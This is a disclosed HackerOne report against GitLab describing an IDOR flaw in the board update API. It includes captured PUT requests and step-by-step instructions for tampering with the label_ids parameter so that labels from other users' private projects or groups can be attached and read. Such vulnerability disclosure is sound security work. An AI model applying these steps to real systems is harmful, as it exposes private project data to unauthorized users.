# Add and Access to Labels of any Private Projects/Groups of Gitlab(IDOR)

## Report Details
- **Report ID**: 439729
- **URL**: https://hackerone.com/reports/439729
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-11-13T03:44:45.389Z
- **Disclosed**: 2019-09-19T19:25:06.817Z

## Reporter
- **Username**: indoappsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
**Summary & Description :
If you have a private project or private group then no non member should be able to access any information.But Adding Labels in your Private boards API request is vulnerable to IDOR attack which is leading to add private group/project labels and access it. 

##Vulnerable Request for Project :
```
PUT /[username]/[project_name]/boards/[board_id].json HTTP/1.1
Host: gitlab.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 178
Connection: close
Cookie: [Cookies]

{"board":{"id":857058,"name":"Development","labels":[{"id":,"title":"","color":"#428BCA"}],"milestone_id":null,"assignee":{},"weight":null,"label_ids":[[Label_ID]]}}

```

Vulnerable parameter : label_ids : Label_ID

##Vulnerable Request for Group :
```
PUT /groups/vijaykumar007Publicgroup/-/boards/848604.json HTTP/1.1
Host: gitlab.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 186
Connection: close
Cookie: [Cookies]

{"board":{"id":848604,"name":"Developmenthacked","labels":[{"id":,"title":"","color":"#F0AD4E"}],"milestone_id":null,"assignee":{},"weight":null,"label_ids":[label_ID]}}
```
Vulnerable labelID : label_ids


## Steps To Reproduce:
Take 2 different accounts to reproduce this issue.Also I am taking Project for reproduction. 
1.Login from Victim account and create a project.
2.Make the project private, don't add any member and try to remove all the public permission so it doesn't mixup any permissions.
3.Create a new label.(Victim_label,ID:12345)
4.Now login from Attacker account and try to access the victim project. 
5.You will notice that you are not able to victim project.
6.Now create a new project and go to labels.
7.Create a new label and go to boards.
8.Edit the Board and you will see label section.
9.Add label into the board and intercept the save request. 
10.The request would look something like above mentioned request. 
11.Change the labelID parameter to victim_label_ID in parameter "label_ids" and send the request. 
12.You will notice that the private label will be added into the board and you will be able to access it.
Same you can apply on Private groups too.


## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

## Impact

Add and Access to Labels of any Private Projects/Groups of Gitlab(IDOR)

## Attachments
No attachments
